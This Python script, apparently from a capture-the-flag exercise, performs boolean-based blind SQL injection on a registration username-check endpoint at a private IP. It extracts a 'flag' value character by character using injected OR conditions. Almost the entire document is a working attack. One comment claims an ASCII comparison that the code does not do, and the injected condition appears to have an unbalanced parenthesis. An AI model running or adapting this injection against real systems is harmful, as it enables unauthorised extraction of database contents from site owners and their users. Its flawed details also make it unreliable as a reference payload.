import urllib.request
import urllib.parse
import string

target = "http://10.67.179.8"
charset = string.ascii_letters + string.digits + "{}:_-"

def test_condition(condition):
    params = urllib.parse.urlencode({"username": f"' OR ({condition})-- -"})
    url = f"{target}/register/user-check?{params}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = resp.read().decode()
            return '"available":false' in data
    except Exception as e:
        print(f"Error: {e}")
        return False

# Test basic conditions first
print("Testing basic connectivity...")
true_result = test_condition("1=1")
print(f"  TRUE (1=1): {true_result}")
false_result = test_condition("1=2")
print(f"  FALSE (1=2): {false_result}")

# Better approach - use ASCII comparison instead of string comparison
# SELECT SUBSTRING(flag,1,1) FROM flag)='T'
print("\nExtracting flag with direct char compare...")
flag = ""
for pos in range(1, 60):
    found = False
    for c in charset:
        escaped = c
        cond = f"SELECT SUBSTRING(flag,{pos},1) FROM flag)='{escaped}'"
        if test_condition(cond):
            flag += c
            print(f"[{pos}] '{c}' -> {flag}")
            found = True
            break
    if not found:
        print(f"Stopped at position {pos}")
        break

print(f"\nFLAG: {flag}")
